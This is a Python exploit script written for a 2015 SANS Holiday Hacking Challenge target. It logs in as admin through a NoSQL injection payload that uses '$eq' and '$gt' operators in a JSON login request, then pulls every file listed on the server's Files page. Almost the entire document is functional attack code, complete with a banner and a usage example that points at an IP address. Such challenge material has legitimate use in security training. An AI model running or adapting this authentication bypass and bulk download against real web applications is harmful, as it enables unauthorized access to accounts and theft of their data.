#!/usr/bin/python
#
# Exploit Title: SANS Holiday Hacking Challenge GIYH SG03 File Download Exploit
# Date: 12/2015
# Exploit Author: @deckerXL
# Version: 1.1
# Tested on: sg03
# Description: This will perform a NoSQLi attack bypassing authentication, logging in as admin, and automatically downloading all files listed in the Files page

import sys
import json
import urllib
import urllib2

debug           = False
user            = "admin"
nosqli_data     = { "username": {"$eq": ""}, "password": {"$gt": ""}}
filestartmarker = 'files?d='
fileendmarker   = '">Download'

def usage():
	print "Usage:"
	print "./giyh-sg03-nosqli-download.py <ip> <port> <command> [-d]\n"
	print "<command>"
	print "  D = Download file from Files section"
	print "Example:"
	print "./giyh-sg03-nosqli-download.py 52.64.191.71 80 D"
	sys.exit(1)

def pmsg( str, code ):
        if ( code == 0 ):
                print "        [*] "+str      # Status message
        elif ( code == 1):
                print "        [+] "+str      # Success message
        elif ( code == 2):
                print "        [-] "+str      # Error message
        else:
                pass

def banner():
	print ""
	print "       =[ ----------------------------------------------- ]"
	print "+ -- --=[ GIYH SG03 File Download Exploit                 ]"
	print "       =[                                     by deckerXL ]"
	print "       =[ ----------------------------------------------- ]"
	print "                                                    __     "
	print "                                                 .-'  |    "
	print "                                                /   <\|    "
	print "                                               /     \'    "
	print "                                               |_.- o-o    "
	print "                                               / C  -._)\  "
	print "          ________.________.___. ___ ___      /',        | "
        print "         /  _____/|   \__  |   |/   |   \    |   `-,_,__,' "
        print "        /   \  ___|   |/   |   /    ~    \   (,,)====[_]=| "
        print "        \    \_\  \   |\____   \    Y    /     '.   ____/  "
        print "         \______  /___|/ ______|\___|_  /       | -|-|_    "
        print "                \/     \/             \/        |____)_)   "
	print ""


class NoRedirectHandler(urllib2.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        infourl = urllib.addinfourl(fp, headers, req.get_full_url())
        infourl.status = code
        infourl.code = code
        return infourl
    http_error_300 = http_error_302
    http_error_301 = http_error_302
    http_error_303 = http_error_302
    http_error_307 = http_error_302

opener = urllib2.build_opener(NoRedirectHandler())
urllib2.install_opener(opener)

# =============================================================
# Check input parameters
# =============================================================
if (len(sys.argv)< 4):
	usage();

ip = sys.argv[1][0:15]
try:
	port = int(sys.argv[2][0:5])
except:
	pmsg ("ERROR - Invalid Port: ["+sys.argv[2]+"]",2)
	usage()

command = sys.argv[3][0:1]

if (command == "D"):
	pmsg ("Attempting to download all files listed on the Files page...",0)
else:
	pmsg ("ERROR - Invalid Command: ["+sys.argv[3]+"]",2)
	usage()

if ("-d" in sys.argv):
	debug = True

url = "http://"+ip+":"+str(port)+"/"
nosqli_data["username"]["$eq"] = user

banner()

# =============================================================
# Initial GET Request to get a valid sessionid
# =============================================================
pmsg ("Retrieving an initial valid sessionid from URL ["+url+"]...",0)
try:
	req_init = urllib2.Request(url)
	req_init.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
	res_init = urllib2.urlopen(req_init)
except:
	pmsg ("ERROR - Connecting to URL: ["+url+"]",2)
	sys.exit(1)
	
init_headers = res_init.info()
init_body = res_init.read()

if (debug):
	print "Init Headers & Body ------------------------------------------------------------"
	print init_headers
	print "--------------------------------------------------------------------------------"
	print "["+init_body+"]"
	print "--------------------------------------------------------------------------------"

sessionid = str(filter(lambda x: 'sessionid' in x, init_headers.headers)[0]).split(' ')[1].split('=')[1].split(';')[0]
pmsg ("Got an initial valid sessionid: ["+sessionid+"]!",1)
res_init.close()

# =============================================================
# GET Admin sessionid
# =============================================================
req_nosqli = urllib2.Request(url)
req_nosqli.add_header('Content-Type', 'application/json')
req_nosqli.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
req_nosqli.add_header('Cookie', 'sessionid='+sessionid)
res_nosqli = urllib2.urlopen(req_nosqli, json.dumps(nosqli_data))
admin_headers = res_nosqli.info()
admin_body = res_nosqli.read()

if (debug):
	print "Admin Headers & Body -----------------------------------------------------------"
	print admin_headers
	print "--------------------------------------------------------------------------------"
	print "["+admin_body+"]"
	print "--------------------------------------------------------------------------------"

admin_sessionid = str(filter(lambda x: 'sessionid' in x, admin_headers.headers)[0]).split(' ')[1].split('=')[1].split(';')[0]
pmsg ("Got an ADMIN valid sessionid: ["+admin_sessionid+"]!",1)
res_nosqli.close()

# =============================================================
# Get Files page for files listed there
# =============================================================
filepageurl = url + "files"
req_filepage = urllib2.Request(filepageurl)
req_filepage.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
req_filepage.add_header('Cookie', 'sessionid='+admin_sessionid)
res_filepage = urllib2.urlopen(req_filepage)
filepage_headers = res_filepage.info()
filepage_body = res_filepage.read()

if (debug):
        print "Files Page Headers & Body -----------------------------------------------------"
        print filepage_headers
        print "--------------------------------------------------------------------------------"
        print "["+filepage_body+"]"
        print "--------------------------------------------------------------------------------"

res_filepage.close()

# =============================================================
# Loop and download each file listed in the Files page
# =============================================================
filestart = 0
while (filestart >= 0):
	filestart = filepage_body.find(filestartmarker)
	if (filestart > 0):
		filestart = filestart + len(filestartmarker)
		filepage_body = filepage_body[filestart:]
		fileend = filepage_body.find(fileendmarker)
		file = filestartmarker+filepage_body[0:fileend]
		fileurl = url + file

		if (debug):
			print "Found file in body: ["+file+"] and will fetch with this URL ["+fileurl+"]"

		# =============================================================
		# Get each file
		# =============================================================
		pmsg ("Downloading ["+fileurl+"]...",1)
		req_file = urllib2.Request(fileurl)
		req_file.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
		req_file.add_header('Cookie', 'sessionid='+admin_sessionid)
		res_file = urllib2.urlopen(req_file)
		file_headers = res_file.info()
		file_body = res_file.read()
		
		# =============================================================
		# Write each file
		# =============================================================
		writefile = file.split('=')[1]
		pmsg ("Saving ["+writefile+"]...",1)
		f = open(writefile, 'w')
		f.write(file_body)
		f.close()

		if (debug):
		        print "Files Headers & Body -----------------------------------------------------------"
		        print file_headers
		        print "["+writefile+"]--------------------------------------------------------------------------------"
		        print "["+file_body+"]"
        		print "--------------------------------------------------------------------------------"

		res_file.close()

		filepage_body = filepage_body[fileend:]			# Setup body string for next file

pmsg ("Done!",0)
sys.exit(0)
